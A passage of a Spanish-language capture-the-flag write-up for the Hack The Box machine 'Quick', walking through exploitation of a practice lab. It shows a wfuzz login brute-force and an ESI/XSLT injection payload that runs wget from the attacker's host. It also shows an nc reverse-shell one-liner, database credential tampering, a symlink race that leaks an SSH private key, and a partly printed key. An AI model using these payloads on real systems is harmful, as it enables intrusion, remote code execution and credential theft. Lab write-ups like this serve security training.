&lt;p&gt;Si vamos al enlace de &lt;code&gt;clientes&lt;/code&gt;, obtenemos mas información de los usuarios como la empresa y pais a la cual pertenecen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Volviendo a la pagina principal, haciendo hovering en &lt;code&gt;portal&lt;/code&gt; obtenemos que se nos redirige a otro subdominio, el cual añadiremos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.186 quick.htb portal.quick.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que no podemos visualizar la pagina, aun agregando los subdominios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Investigando un poco del &lt;code&gt;http3&lt;/code&gt;, vemos que la nueva versión de &lt;code&gt;http3&lt;/code&gt; sera la que deje de usar el protocolo &lt;code&gt;TCP&lt;/code&gt; y lo reemplazara por uno nuevo de nombre &lt;code&gt;Quick&lt;/code&gt;. Curiosamente similar al nombre de la maquina.&lt;/p&gt;

&lt;p&gt;Puedes ver mas detalles en el siguiente articulo.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido&quot;&gt;https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para poder usar esta versión experimental, vamos a recompilar una versión de &lt;code&gt;curl&lt;/code&gt;, del siguiente repositorio:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version&quot;&gt;https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para efectos practicos ejecutando los siguientes comandos podremos obtener el binario funcional.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez lo tengamos correctamente instalado, ejecutamos y esta vez si podemos ver la pagina, la cual nos expone algunas rutas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
❯ ./src/.libs/curl -s --http3 &quot;https://portal.quick.htb/&quot; -k
&amp;lt;html&amp;gt;
  &amp;lt;ul&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php&quot;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=contact&quot;&amp;gt;Contact&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=about&quot;&amp;gt;About&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=docs&quot;&amp;gt;References&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;/ul&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos nuevos usuarios en la ruta &lt;code&gt;about&lt;/code&gt; y usamos &lt;code&gt;html2text&lt;/code&gt; para moestrarlo estetico en consola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ./src/.libs/curl -s --http3 &quot;https://portal.quick.htb/?view=about&quot; -k | html2text
****** Quick | About Us ******
***** Our Team *****
[Jane]
***** Jane Doe *****
CEO &amp;amp; Founder
Quick Broadband services established in 2012 by Jane.
jane@quick.htb
[Mike]
***** Mike Ross *****
Sales Manager
Manages the sales and services.
mike@quick.htb
[John]
***** John Doe *****
Web Designer
Front end developer.
john@quick.htb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos un &lt;code&gt;pdf&lt;/code&gt;, donde podemos obtener una contraseña &lt;code&gt;Quick4cc3$$&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./src/.libs/curl --http3 &quot;https://portal.quick.htb/docs/QuickStart.pdf&quot; -k --output QuickStart.pdf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos dirigimos al panel principal y vamos al enlace &lt;code&gt;Get Started&lt;/code&gt;, que nos redirige a un panel de logeo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Contamos con una contraseña, pero recordemos que anteriormente obtuvimos una lista de usuarios. Como el panel de logeo nos pide un email valido, vamos a crearnos un diccionario con los usuarios que obtuvimos, y ya que tambien se nos filtro la compañia y pais de origen de cada uno, podemos computar posibles correos a partir de estos datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat users.txt
tim@qconsulting.co.uk
tim@qconsulting.co
tim@qconsulting.uk
tim@qconsulting.com
tim@quick.htb
roy@darkwng.us
roy@quick.htb
roy@darkwng.com
elisa@wink.uk
elisa@wink.co.uk
elisa@quick.htb
elisa@wink.com
james@lazycoop.cn
james@lazycoop.com
james@quick.htb
mike@quick.htb
jane@quick.htb
jhon@quick.htb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora mediante fuerza bruta trataremos de encontrar una credencial valida, para ello usaremos &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 50 -w $(pwd)/users.txt -d 'email=FUZZ&amp;amp;password=Quick4cc3$$' &quot;http://10.10.10.186:9001/login.php&quot;
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.186:9001/login.php
Total requests: 18

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000003:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.uk&quot;                                                                                                  
000000007:   200        0 L      2 W        80 Ch       &quot;roy@quick.htb&quot;                                                                                                       
000000015:   200        0 L      2 W        80 Ch       &quot;james@quick.htb&quot;                                                                                                     
000000014:   200        0 L      2 W        80 Ch       &quot;james@lazycoop.com&quot;                                                                                                  
000000001:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.co.uk&quot;                                                                                               
000000012:   200        0 L      2 W        80 Ch       &quot;elisa@wink.com&quot;                                                                                                      
000000016:   200        0 L      2 W        80 Ch       &quot;mike@quick.htb&quot;                                                                                                      
000000013:   200        0 L      2 W        80 Ch       &quot;james@lazycoop.cn&quot;                                                                                                   
000000018:   200        0 L      2 W        80 Ch       &quot;jhon@quick.htb&quot;                                                                                                      
000000017:   200        0 L      2 W        80 Ch       &quot;jane@quick.htb&quot;                                                                                                      
000000006:   200        0 L      2 W        80 Ch       &quot;roy@darkwng.us&quot;                                                                                                      
000000010:   302        0 L      0 W        0 Ch        &quot;elisa@wink.co.uk&quot;                                                                                                    
000000011:   200        0 L      2 W        80 Ch       &quot;elisa@quick.htb&quot;                                                                                                     
000000009:   200        0 L      2 W        80 Ch       &quot;elisa@wink.uk&quot;                                                                                                       
000000002:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.co&quot;                                                                                                  
000000005:   200        0 L      2 W        80 Ch       &quot;tim@quick.htb&quot;                                                                                                       
000000008:   200        0 L      2 W        80 Ch       &quot;roy@darkwng.com&quot;                                                                                                     
000000004:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.com&quot;                                                                                                 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que uno nos reporta un codigo de estado &lt;code&gt;302&lt;/code&gt;, validamos las credenciales y ganamos acceso a un panel de generación de &lt;code&gt;tickets&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anteriormente vimos que el servicio web, usaba &lt;code&gt;esigate&lt;/code&gt; y buscando vulnerabilidades asociadas encontramos que podemos hace una inyección para obtener &lt;code&gt;RCE a traves de XSLT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Dejo el siguiente articulo si quieres saber a detalle en que consiste la vulnerabilidad y su explotación paso a paso.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/&quot;&gt;https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para explotar vamos a crear dos archivo con extension &lt;code&gt;xml y xsl&lt;/code&gt;, con el mismo contenido, donde en la opción &lt;code&gt;CDATA&lt;/code&gt; inyectaremos el codigo que queremos ejecutar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
&amp;lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&amp;gt;
&amp;lt;xsl:output method=&quot;xml&quot; omit-xml-declaration=&quot;yes&quot;/&amp;gt;
&amp;lt;xsl:template match=&quot;/&quot;
xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&amp;gt;
&amp;lt;root&amp;gt;
&amp;lt;xsl:variable name=&quot;cmd&quot;&amp;gt;&amp;lt;![CDATA[wget http://10.10.16.4/shell]]&amp;gt;&amp;lt;/xsl:variable&amp;gt;
&amp;lt;xsl:variable name=&quot;rtObj&quot; select=&quot;rt:getRuntime()&quot;/&amp;gt;
&amp;lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtObj, $cmd)&quot;/&amp;gt;
Process: &amp;lt;xsl:value-of select=&quot;$process&quot;/&amp;gt;
Command: &amp;lt;xsl:value-of select=&quot;$cmd&quot;/&amp;gt;
&amp;lt;/root&amp;gt;
&amp;lt;/xsl:template&amp;gt;
&amp;lt;/xsl:stylesheet&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Asi mismo como vamos a hacer una petición a un archivo de nuestra maquina de nombre &lt;code&gt;shell&lt;/code&gt;, vamos a introducir dentro de este un codigo en bash que nos permita obtener una rever shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat shell
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente sera ejecutar el siguiente codigo en la opción de &lt;code&gt;raise ticket&lt;/code&gt;, donde realizaremos una petición a los archivos previamente creados.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;esi:include src=&quot;http://10.10.16.4/a.xml&quot; stylesheet=&quot;http://10.10.16.4/a.xsl&quot;&amp;gt;
&amp;lt;/esi:include&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Se nos generara un codigo de ticket.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buscamos el ticket en la ruta &lt;code&gt;search.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y en consecuencia recibimos la petición, que indica que se subio nuestro archivo &lt;code&gt;shell&lt;/code&gt; a la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.186 - - [16/Jun/2023 23:40:17] &quot;GET /a.xsl HTTP/1.1&quot; 200 -
10.10.10.186 - - [16/Jun/2023 23:40:17] &quot;GET /a.xml HTTP/1.1&quot; 200 -
10.10.10.186 - - [16/Jun/2023 23:40:18] &quot;GET /shell HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora debemos hacer el mismo proceso, pero esta vez modificaremos nuestros archivos con el comando inyectado en &lt;code&gt;CDATA&lt;/code&gt; por &lt;code&gt;bash shell&lt;/code&gt;, para que se ejecute nuestro archivo.&lt;/p&gt;

&lt;p&gt;Para evitar problemas en esta segunda petición modifiquemos el nombre de los archivos &lt;code&gt;xml y xsl&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
&amp;lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&amp;gt;
&amp;lt;xsl:output method=&quot;xml&quot; omit-xml-declaration=&quot;yes&quot;/&amp;gt;
&amp;lt;xsl:template match=&quot;/&quot;
xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&amp;gt;
&amp;lt;root&amp;gt;
  &amp;lt;xsl:variable name=&quot;cmd&quot;&amp;gt;&amp;lt;![CDATA[bash shell]]&amp;gt;&amp;lt;/xsl:variable&amp;gt;
&amp;lt;xsl:variable name=&quot;rtObj&quot; select=&quot;rt:getRuntime()&quot;/&amp;gt;
&amp;lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtObj, $cmd)&quot;/&amp;gt;
Process: &amp;lt;xsl:value-of select=&quot;$process&quot;/&amp;gt;
Command: &amp;lt;xsl:value-of select=&quot;$cmd&quot;/&amp;gt;
&amp;lt;/root&amp;gt;
&amp;lt;/xsl:template&amp;gt;
&amp;lt;/xsl:stylesheet&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Realizamos la misma ejecución.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos genera otro nuevo ticket que al buscarlo nuevamente en la ruta &lt;code&gt;search.php&lt;/code&gt;, ejecuta el archivo dandonos acceso al sistema como el usuario &lt;code&gt;sam&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.186 - - [17/Jun/2023 00:04:41] &quot;GET /c.xsl HTTP/1.1&quot; 200 -
10.10.10.186 - - [17/Jun/2023 00:04:42] &quot;GET /c.xml HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:38672.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
sam
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como es de costumbre, ahora ganaremos acceso con una &lt;code&gt;tty full interactive&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
Script started, file is /dev/null
sam@quick:~$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
sam@quick:~$ export TERM=xterm
sam@quick:~$ export SHELL=bash
sam@quick:~$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;sam&lt;/code&gt; y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:~$ ls
esigate-distribution-5.2  shell  user.txt
sam@quick:~$ cat user.txt 
359179c57000cd4aa582740c4a637cc6
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que el servicio corre en un &lt;code&gt;apache&lt;/code&gt;, visualizamos el archivo de configuración y encontramos un nuevo subdominio &lt;code&gt;printerv2.quick.htb&lt;/code&gt;, correspondiente a otro panel de logeo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:~$ 2cat /etc/apache2/sites-enabled/000-default.conf 
&amp;lt;VirtualHost *:80&amp;gt;
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with &quot;a2disconf&quot;.
	#Include conf-available/serve-cgi-bin.conf
&amp;lt;/VirtualHost&amp;gt;
&amp;lt;VirtualHost *:80&amp;gt;
	AssignUserId srvadm srvadm
	ServerName printerv2.quick.htb
	DocumentRoot /var/www/printer
&amp;lt;/VirtualHost&amp;gt;
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procemos a añadir el nuevo subdominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.186 printerv2.quick.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enumerando el sistema, encontramos un archivo con las credenciales de la base de datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:/var/www/html$ ls
clients.php  db.php  home.php  index.php  login.php  search.php  ticket.php
sam@quick:/var/www/html$ cat db.php 
&amp;lt;?php
$conn = new mysqli(&quot;localhost&quot;,&quot;db_adm&quot;,&quot;db_p4ss&quot;,&quot;quick&quot;);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procemos a enumerar la base de datos y vemos las contraseñas hasheadas de los usuarios.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;sam@quick:/var/www/html$ mysql -udb_adm -pdb_p4ss -D quick
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 128
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&amp;gt; show tables;
+-----------------+
| Tables_in_quick |
+-----------------+
| jobs            |
| tickets         |
| users           |
+-----------------+
3 rows in set (0.00 sec)

mysql&amp;gt; describe users;
+----------+---------------+------+-----+---------+-------+
| Field    | Type          | Null | Key | Default | Extra |
+----------+---------------+------+-----+---------+-------+
| name     | varchar(100)  | YES  |     | NULL    |       |
| email    | varchar(100)  | YES  |     | NULL    |       |
| password | varchar(1000) | YES  |     | NULL    |       |
+----------+---------------+------+-----+---------+-------+
3 rows in set (0.00 sec)

mysql&amp;gt; select email, password from users;
+------------------+----------------------------------+
| email            | password                         |
+------------------+----------------------------------+
| elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+------------------+----------------------------------+
2 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probamos a tratar de crackear los hashes pero no nos resulta posible, pero debemos recordar que al ser el usuario &lt;code&gt;db_adm&lt;/code&gt;, podemos tener algunos privilegios entre ellos el de modificar las credenciales.&lt;/p&gt;

&lt;p&gt;Para ello como ya contamos con la password de &lt;code&gt;elisa&lt;/code&gt;, vamos a modificar a tratar de modificar la password del usuario &lt;code&gt;srvadm&lt;/code&gt;, de tal modo que sea la misma.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql&amp;gt; update users set password=&quot;c6c35ae1f3cb19438e0199cfa72a9d9d&quot; where email=&quot;srvadm@quick.htb&quot;;
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos exitosamente con las nuevas credenciales &lt;code&gt;srvadm@quick.htb:Quick4cc3$$&lt;/code&gt; y ganamos acceso a una aplicación de impresoras.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si seleccionamos la opción &lt;code&gt;add printer&lt;/code&gt;, vemos que se establece una conexión al puerto &lt;code&gt;9100&lt;/code&gt; y si ingresamos nuestra ip, recibimos una conexión al imprimir.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 9100
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:44216.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al continuar enumerando el sistema, encontramos un archivo de nombre &lt;code&gt;job.php&lt;/code&gt;, el cual crea un archivo con nombre de la fecha actual y lo almance en la ruta &lt;code&gt;/var/www/jobs&lt;/code&gt; con el contenido que ingresamos en &lt;code&gt;bill details&lt;/code&gt; en jobs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podemos observar que despues genera una conexión a una ip y puerto especifico, donde envia dicho contenido. Pero vemos algo muy interesante ya que en el proceso se ejecuta un &lt;code&gt;sleep(0.5)&lt;/code&gt; de medio segundo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
require __DIR__ . '/escpos-php/vendor/autoload.php';
use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;
use Mike42\Escpos\Printer;
include(&quot;db.php&quot;);
session_start();

if($_SESSION[&quot;loggedin&quot;])
{
	if(isset($_POST[&quot;submit&quot;]))
	{
		$title=$_POST[&quot;title&quot;];
		$file = date(&quot;Y-m-d_H:i:s&quot;);
		file_put_contents(&quot;/var/www/jobs/&quot;.$file,$_POST[&quot;desc&quot;]);
		chmod(&quot;/var/www/printer/jobs/&quot;.$file,&quot;0777&quot;);
		$stmt=$conn-&amp;gt;prepare(&quot;select ip,port from jobs&quot;);
		$stmt-&amp;gt;execute();
		$result=$stmt-&amp;gt;get_result();
		if($result-&amp;gt;num_rows &amp;gt; 0)
		{
			$row=$result-&amp;gt;fetch_assoc();
			$ip=$row[&quot;ip&quot;];
			$port=$row[&quot;port&quot;];
			try
			{
				$connector = new NetworkPrintConnector($ip,$port);
				sleep(0.5); //Buffer for socket check
				$printer = new Printer($connector);
				$printer -&amp;gt; text(file_get_contents(&quot;/var/www/jobs/&quot;.$file));
				$printer -&amp;gt; cut();
				$printer -&amp;gt; close();
				$message=&quot;Job assigned&quot;;
				unlink(&quot;/var/www/jobs/&quot;.$file);
			}
			catch(Exception $error) 
			{
				$error=&quot;Can't connect to printer.&quot;;
				unlink(&quot;/var/www/jobs/&quot;.$file);
			}
		}
		else
		{
			$error=&quot;Couldn't find printer.&quot;;
		}
	}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos aprovecharnos de este &lt;code&gt;sleep&lt;/code&gt;, para poder crearnos un archivo con el nombre de la fecha actual, y cuando se ejecute el &lt;code&gt;sleep&lt;/code&gt; puedo secuestrar el contenido original para crear un link simbolico que apunte a la clave &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;srvadm&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello ejecutare la siguente instrucción.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:/var/www/printer$ while true; do fecha=$(date +%F_%H:%M:%S); if [ -r $fecha ]; then ln -s -f /home/srvadm/.ssh/id_rsa $fecha; break; fi; done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Me pondre en escucha por el puerto &lt;code&gt;9100&lt;/code&gt; y agregare un contenido en &lt;code&gt;bill details&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recibimos con exito la clave &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;srvadm&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 9100
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:44256.
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
